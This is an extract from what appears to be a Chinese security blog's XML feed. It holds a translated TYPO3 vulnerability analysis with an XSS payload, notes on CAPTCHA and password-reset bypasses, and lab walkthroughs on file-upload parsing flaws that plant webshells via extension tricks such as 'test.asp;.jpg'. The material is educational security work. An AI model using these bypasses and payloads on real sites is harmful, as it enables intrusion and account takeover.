href="https://blog.ripstech.com/videos/typo3_957.mp4）" target="_blank" rel="noopener">https://blog.ripstech.com/videos/typo3_957.mp4）</a></p><h2 id="0x03-技术细节"><a href="#0x03-技术细节" class="headerlink" title="0x03 技术细节"></a>0x03 技术细节</h2><p>在TYPO3中保存后端表单时，将调用$formDataCompiler对象的compile()方法。参数是一个使用用户输入填充的数组，如下第8行所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typo3/sysext/backend/Classes/Controller/EditDocumentController.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">  $this-&gt;overrideVals = $parsedBody[&apos;overrideVals&apos;] ?? </span><br><span class="line">    $queryParams[&apos;overrideVals&apos;] ?? null;</span><br><span class="line">  // ... </span><br><span class="line">  $formDataCompilerInput[&apos;overrideValues&apos;] = $this-&gt;overrideVals[$table];</span><br><span class="line">  $formData = $formDataCompiler-&gt;compile($formDataCompilerInput);</span><br></pre></td></tr></table></figure><p>该方法使用for-loop遍历一个有序的FormDataProvider对象列表，并按顺序在每个$provider对象上调用addData()方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typo3/sysext/backend/Classes/Form/FormDataGroup/OrderedProviderList.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">public function compile(array $result): array</span><br><span class="line">&#123;</span><br><span class="line">  // ...</span><br><span class="line">  foreach ($orderedDataProvider as $providerClassName =&gt; $providerConfig) &#123;</span><br><span class="line">    // ...</span><br><span class="line">    $result = $provider-&gt;addData($result);</span><br><span class="line">  &#125;</span><br><span class="line">  return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码的第9行，$provider-&gt;addData()的参数$result在下面的addData()方法调用作为其参数。在每次迭代时，变量$result表示数组在$provider处理完其内容后被修改。其中一个providers是DatabaseRecordOverrideValues类的一个实例，该类允许覆盖从数组$result中提取的数据，其中数组的行列值分别为databaseRow和任意key值。</p><p>typo3/sysext/backend/Classes/Form/FormDataProvider/DatabaseRecordOverrideValues.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function addData(array $result)</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($result[&apos;overrideValues&apos;] as $fieldName =&gt; $fieldValue) &#123;</span><br><span class="line">        if (isset($result[&apos;processedTca&apos;][&apos;columns&apos;][$fieldName])) &#123;</span><br><span class="line">            $result[&apos;databaseRow&apos;][$fieldName] = $fieldValue;</span><br><span class="line">            // ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，下列FormDataProvider对象之一实现了unserialize()方法对被覆盖数据的调用，从而导致漏洞：</p><p>typo3/sysext/backend/Classes/Form/FormDataProvider/DatabaseLanguageRows.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function addData(array $result)</span><br><span class="line">&#123;</span><br><span class="line">  // ...</span><br><span class="line">  if (/*...*/) </span><br><span class="line">  &#123;</span><br><span class="line">    $result[&apos;defaultLanguageDiffRow&apos;][$defaultLanguageKey] = unserialize(</span><br><span class="line">        $result[&apos;databaseRow&apos;][$result[&apos;processedTca&apos;][&apos;ctrl&apos;]</span><br><span class="line">        [&apos;transOrigDiffSourceField&apos;]]);</span><br></pre></td></tr></table></figure></p><p>这里是有关如何通过工具链expoit PHP对象注入的更多信息的链接： （<a href="https://blog.ripstech.com/2018/php-object-injection）" target="_blank" rel="noopener">https://blog.ripstech.com/2018/php-object-injection）</a></p><h2 id="0x04-CVE-2019-12748：在后端的存储型XSS"><a href="#0x04-CVE-2019-12748：在后端的存储型XSS" class="headerlink" title="0x04 CVE-2019-12748：在后端的存储型XSS"></a>0x04 CVE-2019-12748：在后端的存储型XSS</h2><p>CMS TYPO3的后端中存在跨站脚本漏洞（CVE-2019-12748）。有权访问Site Redirects部分的非特权用户可以利用t3://伪协议注入一个恶意的URL。<br><code>t3://url/?url=javascript:alert(1);</code><br>通过添加这个特定的站点，可以重定向另一个拥有更高权限的TYPO3用户，从而诱使他们点击触发恶意JavaScript的链接。攻击者可以将此漏洞作为启动远程代码执行漏洞攻击的支点。</p><p>TYPO3会阻止用户利用链接和URL中危险的javascript:伪协议，这意味着TYPO3将直接执行JavaScript。但是，它并不阻止用户利用TYPO3的内置t3://伪协议，该协议实现了多种功能，例如引用TYPO3内部页面，文件，邮件地址或URLs。实际上，指定一个自动转换为可点击链接的URL将绕过TYPO3的白名单，该白名单最初的作用是阻止javascript:伪协议。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>本文所述的漏洞会对具有一个或多个TYPO3后端的用户的TYPO3系统产生严重的影响。经过身份验证并且可以访问Pages部分的后端用户可以在底层远程系统上执行代码。攻击者可以利用Site Redirects模块中的跨站脚本漏洞作为利用此漏洞的支点。</p><h2 id="0x06-时间线"><a href="#0x06-时间线" class="headerlink" title="0x06 时间线"></a>0x06 时间线</h2><p>2019年5月9日：提交漏洞<br>2019年5月9日：漏洞确认<br>2019年5月10日：与厂商安全负责人协调解决问题<br>2019年6月6日：厂商通知6月25号发布补丁<br>2019年6月25日：TYPO3 9.5.8补丁发布</p><h2 id="0x07-参考文献"><a href="#0x07-参考文献" class="headerlink" title="0x07 参考文献"></a>0x07 参考文献</h2><p>WordPress 5.1 CSRF to Remote Code Execution：</p><p><a href="https://blog.ripstech.com/2019/wordpress-csrf-to-rce" target="_blank" rel="noopener">https://blog.ripstech.com/2019/wordpress-csrf-to-rce</a></p><p>Magento 2.3.1: Unauthenticated Stored XSS to RCE：</p><p><a href="https://blog.ripstech.com/2019/magento-rce-via-xss" target="_blank" rel="noopener">https://blog.ripstech.com/2019/magento-rce-via-xss</a></p><p>MyBB &lt;= 1.8.20: From Stored XSS to RCE：</p><p><a href="https://blog.ripstech.com/2019/mybb-stored-xss-to-rce" target="_blank" rel="noopener">https://blog.ripstech.com/2019/mybb-stored-xss-to-rce</a></p><p>WordPress 5.0.0 Remote Code Execution：</p><p><a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution" target="_blank" rel="noopener">https://blog.ripstech.com/2019/wordpress-image-remote-code-execution</a></p><p>CTF Writeup: Complex Drupal POP Chain：</p><p><a href="https://blog.ripstech.com/2019/complex-drupal-pop-chain" target="_blank" rel="noopener">https://blog.ripstech.com/2019/complex-drupal-pop-chain</a></p><p>本文翻译自 blog.ripstech.com， 原文链接 。如若转载请注明出处。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>验证码绕过、密码找回漏洞</title>
      <link href="/2019/12/07/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/07/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="验证码作用"><a href="#验证码作用" class="headerlink" title="验证码作用"></a>验证码作用</h2><p>验证码（CAPTCHA）是“Completely Automated Public Turing test to tell Computers and Humans Apart”（全自动区分计算机和人类的图灵测试）的缩写，是一种区分用户是计算机还是人的公共全自动程序。</p><p>可以防止：恶意破解密码、刷票、论坛灌水，有效防止某个黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试，实际上用验证码是现在很多网站通行的方式，我们利用比较简易的方式实现了这个功能。这个问题可以由计算机生成并评判，但是必须只有人类才能解答。</p><p>由于计算机无法解答CAPTCHA的问题，所以回答出问题的用户就可以被认为是人类。</p><p>验证码的种类很多，有滑块验证，纯数字验证，点击字符，数字运算等……<br>而我们能有效的利用验证码防止恶意破解密码、刷票、论坛灌水、刷页。</p><h2 id="验证码常见的绕过姿势"><a href="#验证码常见的绕过姿势" class="headerlink" title="验证码常见的绕过姿势"></a>验证码常见的绕过姿势</h2><h3 id="验证码不失效"><a href="#验证码不失效" class="headerlink" title="验证码不失效"></a>验证码不失效</h3><ul><li>造成原因：找回密码的时候获取的验证码缺少时间限制仅值判断了验证码是够正确未判断验证码是否过期。</li><li>测试方法：通过枚举找到真正的验证码输入验证码完成验证。</li></ul><p>###验证码重复使用<br>验证码可以多次重复，如果现在的验证码为1106，如果登录失了，验证码会换但是输入1106，还是判定验证码正确；<a href="http://www.anquan.us/static/bugs/wooyun-2016-0169672.html" target="_blank" rel="noopener">案例</a></p><h3 id="未校验用户字段的值"><a href="#未校验用户字段的值" class="headerlink" title="未校验用户字段的值"></a>未校验用户字段的值</h3><ul><li>造成原因：在整个重置密码的流程中，只对验证码和手机号做了校验，未对后面设置新密码的用户身份做判断，导致在最后一步通过修改用户身份来重置他人的密码。</li><li>测试方法：使用自己的手机号走流程，在走到最后一个设置密码的流程时，修改数据包里的用户信息。<h3 id="前端验证验证码"><a href="#前端验证验证码" class="headerlink" title="前端验证验证码"></a>前端验证验证码</h3></li><li>造成原因：只在前端进行验证没有进行后端验证</li><li>测试方法：直接抓包进行跑数据包，反正没验证码的阻碍。<h3 id="修改密码处id可替换"><a href="#修改密码处id可替换" class="headerlink" title="修改密码处id可替换"></a>修改密码处id可替换</h3></li><li>造成原因：修改密码的时候，没有对原密码进行判断，且根据id的值来修改用户的密码，类似的SQL语句：update user set  password=”qwer1234” where id = ‘1’修改数据包里的id的值，即可修改他人密码。</li><li>测试方法：修改自己用户密码，抓取数据包，替换数据包中用户对应的id值，即可修改他人的密码。<h3 id="验证码无校验"><a href="#验证码无校验" class="headerlink" title="验证码无校验"></a>验证码无校验</h3></li><li>造成原因：设置了验证码，但却没有校验(真是扯淡……估计开发会被老板砍死)</li><li>测试方法：乱输验证码进行验证即可。<h3 id="验证码空值绕过"><a href="#验证码空值绕过" class="headerlink" title="验证码空值绕过"></a>验证码空值绕过</h3></li><li>造成原因：没对验证码参数进行强制条件，如我们发现登录参数是user=admin&amp;psw=123456&amp;yzm=1312，将验证码传参去掉，留下user=admin&amp;psw=123456就可以绕过验证码机制。</li><li>测试方法：抓包，如看到类似验证码参数，将其去掉，进行发包。<h3 id="验证码可控制"><a href="#验证码可控制" class="headerlink" title="验证码可控制"></a>验证码可控制</h3></li><li>造成原因：有时候验证码通过url传参，就是说我们参数可控，而验证码是通过参数设定的。</li><li>测试方法：直接将参数设置成固定，那么可能验证码就不会变</li></ul><p><strong>绕过姿势有很多种，这里只是给大家介绍几种，能帮助更好的了解此漏洞。</strong></p><h2 id="密码找回漏洞"><a href="#密码找回漏洞" class="headerlink" title="密码找回漏洞"></a>密码找回漏洞</h2><p>有一类验证码，他并不是区分用户是计算机还是人的公共全自动程序，它是用来证明你的身份，比如你登入微信，支付宝，支持短信验证登入，像这类验证码实际上是用来区分你的身份的。<br>当你qq密码忘记密码时候，你需要找回密码，然后他要求把APP现实的动态密码填入框内，一般而言手机验证码都由5-30分钟，如果他没有做尝试限制的话我们是不是可以进行穷举？然后直接跑出验证码就能修改他人的密码？</p><p>第一种就是找回密码，往邮箱发送明文或密码后者验证码(手机短信验证就是玩你的手机发送验证码)通过这样的方式来判断是否是本人</p><p>第二种发送一个重置密码的链接到你的绑定邮箱去，点击则重置密码；</p><h3 id="密码找回漏洞例子"><a href="#密码找回漏洞例子" class="headerlink" title="密码找回漏洞例子"></a>密码找回漏洞例子</h3><ul><li>验证码发送后前端返回<a href="http://www.anquan.us/static/bugs/wooyun-2016-0172266.html" target="_blank" rel="noopener">安利</a></li><li>验证码无次数限制可爆破</li><li>验证码可控<a href="http://www.anquan.us/static/bugs/wooyun-2014-086716.html" target="_blank" rel="noopener">安利</a></li><li>直接修改密码页面<a href="http://www.anquan.us/static/bugs/wooyun-2013-040908.html" target="_blank" rel="noopener">安利</a></li><li>缺失身份——&gt;绑定别人的手机号到自己的手机<a href="http://www.anquan.us/static/bugs/wooyun-2013-016896.html" target="_blank" rel="noopener">安利</a></li><li>越权漏洞——&gt;自己验证码通过改包然后修改他们密码</li></ul><h2 id="靶场实例"><a href="#靶场实例" class="headerlink" title="靶场实例"></a>靶场实例</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbn3k3ewj31h80q37gc.jpg" alt><br>我们看到这是一个后台管理页面，在这里我们可以看到有一个密码找回，他是通过管理员邮箱来找回的，我们可以通过社工和社区寻找管理员的邮箱。</p><p>在这里我们已经找到邮箱了<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbne7ztuj30ir09ddfu.jpg" alt></p><p>我们通过审计代码发现认证码是在10-10000的随机数，那如果它没有输入认证码次数限制，那我们可不可以通过爆破来爆出认证码。<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3si8n7bwqj30t30i1jxq.jpg" alt><br>我们通过burp抓包<br>进行爆破<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbo8p3hxj31gz0q9ah4.jpg" alt></p><p>成功爆破出认证码<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3pbp05856j30kz09jabl.jpg" alt></p><p>我们进行登录<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sj2ny46ij31h20msafk.jpg" alt="https://tva1.sinaimg.cn/large/007rAy9hgy1g3sj2ny46ij31h20msafk.jpg"><br>发现登录成功</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传解析漏洞——解析、验证、伪造（三）</title>
      <link href="/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E3/"/>
      <url>/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E3/</url>
      
        <content type="html"><![CDATA[<p><strong>接上一篇内容</strong></p><h2 id="IIS6-0解析漏洞（一）"><a href="#IIS6-0解析漏洞（一）" class="headerlink" title="IIS6.0解析漏洞（一）"></a>IIS6.0解析漏洞（一）</h2><p>我们现在要讲的第一个是IIS6.0的解析问题：</p><p>iis6.0除了将ASP后缀当成ASP进行解析的同时，当<strong>文件后缀名字为.asa .cer .cdx也会当做asp去解析</strong>，而严格意思上讲这可以说是iis6的一些特性，只是iis6默认的一些默认配置，文件后缀名字为.asa .cer .cdx之所以也会当做asp去解析，是因为<strong>IIS6.0在应用程序扩展中默认设置了.asa .cer .cdx都会调用asp.dll。</strong></p><p>当然，如果我们在iis6.0应用程序扩展配置中添加.allblue调用asp.dll可执行文件路径，那么我们也可以通过.allblue后缀来当成asp文件来解析；</p><p>接下来我们来看靶场：<br><img src="https://s2.ax1x.com/2019/05/23/VPPBQO.png" alt><br>这道题，我们只要通过上传一张图片马，并抓包将后缀改成.asa .cer .cdx其中一种后缀，都会被当成asp文件执行(请注意，我们要解析的是asp文件,所以一句话也要是asp的；也不能再本地直接改后缀名，因为这里会验证文件的文件类型)</p><p>我们将图片马上传并抓包改包<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bco51gejj30z40rkjup.jpg" alt></p><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcotohhjj30z40rkwhz.jpg" alt><br>上传<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcp8pj9rj30kn06zmx7.jpg" alt><br>上传成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcpms01qj31hc05374x.jpg" alt><br>通过菜刀文件连接<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bcpzllsuj30zk0jgq4o.jpg" alt></p><h2 id="IIS6-0解析漏洞（二）"><a href="#IIS6-0解析漏洞（二）" class="headerlink" title="IIS6.0解析漏洞（二）"></a>IIS6.0解析漏洞（二）</h2><p>首先说明下,IIS5和IIS7.5无此漏洞！</p><p>IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞，这一解析漏洞有两种完全不同的利用方式：</p><p>test.asp;.jpg 会被当做asp进行解析<br>text.asp/123.jpg 会被当做asp进行解析</p><p>假如我们请求/aaa.asp;xxxx.jpg<br> 执行过程：</p><ol><li><p>从头部查找查找“.”,获得.asp;xxxx.jpg</p></li><li><p>查找“;”号，如果有则内存截断</p></li><li><p>查找“/”号，如果有则内存截断</p></li></ol><p><strong>最终，将保留下来.asp字符串，从META_SCRIPT_MAP脚本映射表里于扩展名匹配对比，并反馈给asp.dll</strong><br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdy4uguij31320m9tbi.jpg" alt><br>我们先上传图片马<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdyhs8kfj30z40rkgoy.jpg" alt><br>并改包<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdysx2crj30z40rkq6a.jpg" alt><br>上传<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdz1tirij30d903nmx2.jpg" alt><br>上传成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdzav54yj31h80600td.jpg" alt><br>通过菜刀文件连接<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bdzl1189j30zk0jgwgd.jpg" alt></p><h2 id="IIS6-0解析漏洞（三）"><a href="#IIS6-0解析漏洞（三）" class="headerlink" title="IIS6.0解析漏洞（三）"></a>IIS6.0解析漏洞（三）</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bj36uy6oj312t0nigog.jpg" alt><br>IIS6.0还有一个漏洞，在后缀是.asp的文件夹下，里面的文件里只要有asp代码，只要进行访问，都会当做asp文件执行；<br>我们先上传图片看看目录：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bj3yblsnj31hb09ewet.jpg" alt><br>我发现他的文件是存放在.asp后缀文件夹下，那我们是不是可以上传一张图片马上去直接来当成asp文件执行呢？我们试下</p><p>上传成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bjbs3411j31f106nt8q.jpg" alt><br>访问成功<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bje86116j31h204mt9b.jpg" alt></p><p>直接用菜刀连接<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bjepq8mqj30zk0jg75h.jpg" alt></p><h2 id="CGI解析漏洞"><a href="#CGI解析漏洞" class="headerlink" title="CGI解析漏洞"></a>CGI解析漏洞</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3bjhl75i1j312z0ms0vg.jpg" alt><br>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设SCRIPT_FILENAME.</p><p>当访问<a href="http://www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置&quot;phpinfo.jpg/1.php&quot;,然后构造SCRIPT_FILENAME(绝对路径)传递给PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置&quot;phpinfo.jpg/1.php&quot;,然后构造SCRIPT_FILENAME(绝对路径)传递给PHP</a> CGI，如果开启了fix_pathinfo选项，name就会触发在PHP中的如下逻辑：</p><p>PHP会认为SCRIPT_FILENAME(绝对路径)是phpinfo.jpg,而1.php是PATH_INFO,所以就会phpinfo.jpg作为php文件来解析了</p><p>这也是一个逻辑问题，所以说<strong>我们只需要在正常的jpg后面加/.php就可以成功的绕过解析</strong></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传解析漏洞-解析、验证、伪造</title>
      <link href="/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E3%80%81%E4%BC%AA%E9%80%A0/"/>
      <url>/2019/12/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E3%80%81%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞："><a href="#文件上传漏洞：" class="headerlink" title="文件上传漏洞："></a>文件上传漏洞：</h1><p>文件上传漏洞是指网络攻击者上传了一个可执行的文件到服务器并执行。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的利用技术门槛非常的低，对于攻击者来说很容易实施。</p><p>文件上传漏洞本身就是一个危害巨大的漏洞，WebShell更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下WebShell以方便后续进入系统。攻击者在受影响系统放置或者插入WebShell后，可通过该WebShell更轻松，更隐蔽的在服务中为所欲为。</p><p>这里需要特别说明的是上传漏洞的利用经常会使用WebShell，而WebShell的植入远不止文件上传这一种方式。</p><h1 id="webshell："><a href="#webshell：" class="headerlink" title="webshell："></a>webshell：</h1><p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。</p><h1 id="文件上传漏洞的原因："><a href="#文件上传漏洞的原因：" class="headerlink" title="文件上传漏洞的原因："></a>文件上传漏洞的原因：</h1><ul><li>文件上传时检查不严。没有进行文件格式检查。</li><li>文件上传后修改文件名时处理不当。一些应用在服务器端进行了完整的黑名单和白名单过滤，在修改已上传文件文件名时却百密一疏，允许用户修改文件后缀。如应用只能上传.doc文件时攻击者可以先将.php文件后缀修改为.doc，成功上传后在修改文件名时将后缀改回.php。</li></ul><h1 id="文件上传常见检测："><a href="#文件上传常见检测：" class="headerlink" title="文件上传常见检测："></a>文件上传常见检测：</h1><h3 id="1-客户端检测"><a href="#1-客户端检测" class="headerlink" title="1.客户端检测"></a>1.客户端检测</h3><p>一般都是在网页上写一段js脚本，通过js去检测上传文件的后缀名，有白名单形式也有黑名单形式。</p><p><strong>判断方式</strong>：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。前端验证非常不可靠，通过修改数据包后缀名就可以绕过，甚至关闭js都可以尝试绕过。</p><h3 id="2-服务端检测"><a href="#2-服务端检测" class="headerlink" title="2.服务端检测"></a>2.服务端检测</h3><p>检查content-type(内容类型)</p><p>检查后缀(多为检查后缀)</p><p>检查文件头</p><h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h1><p><strong>我们通过upload-labs这个靶场实践来进一步认识文件上传漏洞：</strong></p><h2 id="1-前端验证绕过"><a href="#1-前端验证绕过" class="headerlink" title="1.前端验证绕过"></a>1.前端验证绕过</h2><p>发现有一个上传点:<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/3Mmx5VPtCeDOVajrGQdlsIyRqbXkdDVByTBpXwvgJdA!/b/dE8BAAAAAAAA&amp;bo=JAWAAn4HpQMDCVA!&amp;rf=viewer_4" alt></p><p>我们试着上传一个带一句话的php上去，并开启burp抓包：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/l.JY9E.mj4AfwMwYb5Dctfcfw9EOUQbMT0Z.zi4J4go!/b/dL8AAAAAAAAA&amp;bo=ZQaAAnwGiQIDGSw!&amp;rf=viewer_4" alt><br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/uTXBzs2Ps5cWXXSqyuT6tJycypL.Z6kJ*kCngBftG6s!/b/dDUBAAAAAAAA&amp;bo=8ATgA*AE4AMDGTw!&amp;rf=viewer_4" alt><br>发现被拦截下来，提示只能上传图片类型，而在burp上并无抓取到任何数据，这证明就是一个典型的客户端前端检测</p><p>我们通过将php文件改成jpg文件使其符合检测要求，再在抓取数据包时将文件后缀改回php，从而完成绕过：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/TTZRCftxc3JNuulzU7WceTsyeEqqCQOokzNoepwq*XA!/b/dL4AAAAAAAAA&amp;bo=8ATgA*AE4AMDGTw!&amp;rf=viewer_4" alt></p><p>发现成功上传<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/*EDL2ABep5jCTnuEtx3hbs3zd7SZRFPJR3GKoldj5xc!/b/dLYAAAAAAAAA&amp;bo=gAcyAoAHMgIDGTw!&amp;rf=viewer_4" alt></p><p>通过连接菜刀或直接调用一句话函数都可以实现了getshell；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/4TFYbPyRNP5*fBz2AFQw*IZxJcvcViw.uVEx9OrYYt8!/b/dIMAAAAAAAAA&amp;bo=XQfVA10H1QMDGTw!&amp;rf=viewer_4" alt></p><h2 id="2-Content-Type方式绕过"><a href="#2-Content-Type方式绕过" class="headerlink" title="2.Content-Type方式绕过"></a>2.Content-Type方式绕过</h2><p>分析源码，知道了是对Content-Type(内容类型)和文件头的检测，<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/k7Q*x9fqgWz5dGtJqOsWKzPvTT0idkTpvc1k9nKHPLs!/b/dLgAAAAAAAAA&amp;bo=BgWAAmUHrgMRGWA!&amp;rf=viewer_4" alt></p><p>那我们想到的是就是图片马，图片马是可以很好的绕过内容类型和文件头检测的，在这里我准备好了一个写了一句话的txt文件和一张小图片来合成一张图片马：<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/gz4TwdZE01nQdK7U6tdbyqa9xidrPgWSev6j8jC5.jM!/b/dFMBAAAAAAAA&amp;bo=zADaAMwA2gARGS4!&amp;rf=viewer_4" alt><br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/OJ0mpZH4z1GBmvVyPYgtUiengE6r*78DPKn.ynq4WTc!/b/dMUAAAAAAAAA&amp;bo=nQI*AZ0CPwERGS4!&amp;rf=viewer_4" alt><br>成功生成图片马，然后我们将图片马上传并抓包将后缀改为php，因为web容器是根据后缀去解析不同的文件的，所以我们将他改成php<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/dUa5qe571hvX4y8kSTfD*rEs.jxaziSx8mmE0Yo.9sI!/b/dIQAAAAAAAAA&amp;bo=8ATgA*AE4AMRGS4!&amp;rf=viewer_4" alt><br>最后成功上传，并调用一句话<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/8Temr59hWbfKnh6OUyr0dRh3UCato6TZFcWnUChSbHM!/b/dL8AAAAAAAAA&amp;bo=MQWAAmgHkQMRGWU!&amp;rf=viewer_4" alt><br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ZO3Z5LqU7MPUKOuIRhqiYTwnCmkpNEaHxm1U*T3d1.o!/b/dDQBAAAAAAAA&amp;bo=dAfXA3QH1wMRCT4!&amp;rf=viewer_4" alt></p><h2 id="3-黑名单绕过"><a href="#3-黑名单绕过" class="headerlink" title="3.黑名单绕过"></a>3.黑名单绕过</h2><p>查看源码<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/Nb6czO9WTB4*L6e6mQuqQ7Agi.ex2aNHMb*tv6W2SgM!/b/dLYAAAAAAAAA&amp;bo=ZQW9AmUFvQIRCT4!&amp;rf=viewer_4" alt><br>发现是一个黑名单绕过，它拦截了.asp,.aspx,.php,.jsp后缀的文件，但他拦截了php，是不是就意味着我们就不能上传php文件了呢？其实不是的，在默认状态下<strong>php，php3，php4，php5，phtml</strong>是会被解析成php的，请看下图<br><img src="https://m.qpic.cn/psb?/V133mrMy3dol57/ekwZbyk2edL5EupB09P8Jmdsc2QvPzfargMfRfWj03U!/b/dMAAAAAAAAAA&amp;bo=LgGkAC4BpAARCT4!&amp;rf=viewer_4" alt><br>我们将图片马后缀改成php3，成功将上传，调用一句话，最后成功调用，证明是可以php3是可以被php解析的；<br><img src="http://m.qpic.cn/psb?/V133mrMy3dol57/ER3vfEB2o6Cz20fHXHQSnQVYaezJOBDlDhVPMMSlH4o!/b/dL8AAAAAAAAA&amp;bo=ewfSA3sH0gMRGS4!&amp;rf=viewer_4" alt></p><h2 id="4-htaccess文件绕过"><a href="#4-htaccess文件绕过" class="headerlink" title="4. .htaccess文件绕过"></a>4. .htaccess文件绕过</h2><p><img 